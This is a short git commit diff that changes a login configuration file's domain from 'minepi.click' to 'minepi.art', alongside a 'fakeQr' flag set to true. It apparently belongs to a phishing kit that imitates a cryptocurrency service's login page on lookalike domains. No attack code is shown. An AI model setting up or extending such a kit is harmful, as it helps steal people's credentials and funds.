27b121aa8f2c062dfa1292c4b0db488c8bf99c73
Seized User <164658008+SeizedAssets@users.noreply.github.com>
2025-10-22 14:53:54 -0700

    Update config.ts

--- login/config.ts
+++ login/config.ts
@@ -1,5 +1,5 @@
 // SERVER DETAILS
-export const domain = 'minepi.click';
+export const domain = 'minepi.art';
 export const fullDomain = `https://${domain}`;
 export const proxies: string[] = [];
 export const fakeQr = true;
